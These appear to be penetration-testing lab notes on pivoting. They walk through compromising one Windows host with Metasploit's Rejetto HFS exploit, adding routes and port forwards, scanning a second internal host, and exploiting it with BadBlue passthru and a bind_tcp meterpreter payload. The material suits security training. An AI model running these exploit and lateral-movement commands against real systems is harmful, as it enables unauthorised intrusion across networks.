- Utilizing compromized host to move to other machines
### Steps
- 3 machines: 10.3.28.70 (accessible to attacker); 10.3.24.202 (accessible to 10.3.28.70)
- Gain access to the initial machine:
	```
	> use exploit/windows/http/rejetto_hfs_exec
	> set rhosts 10.3.28.70
	> run
	```
- Add a route, so that you can run commands that can go through this machine
	```
	meterpreter> sysinfo
	meterpreter> getuid
	meterpreter> ipconfig
	meterpreter> run autoroute -s 10.3.28.0/20 # subnet info from ipconfig
	```
- Run a scan against the other machine with the portscan module
	```
	search portscan
	use auxiliary/scanner/portscan/tcp
	set rhosts 10.3.24.202
	set ports 1-100
	run
	```
- Now you know which ports are open on the other target machine. So, the next task is to scan them. For this you create a port forwarding on the machine to which you have access in such a way that the traffic is forwarded from a port on attackers machine which is sent via this machine to the other target machine
	```
	sessions 1
	meterpreter> portfwd add -l 1234 -p 80 -r 10.3.24.202 # 1234 on attackers machine and 80 on the 24.202 machine
	```
- Run an nmap scan against your local port as it gets sent to the other machine
	```
	db_nmap -sV -p1234 localhost
	```
- Exploit it. Set the actual target IP as autoroute will handle that and make sure to change the payload to `bind_tcp` because you can't get a reverse tcp on your local machine in this case as there is no direct connectivity
	```
	use exploit/windows/http/badblue_passthru
	set rhosts 10.3.24.202
	set lport 4433
	set payload windows/meterpreter/bind_tcp
	run
```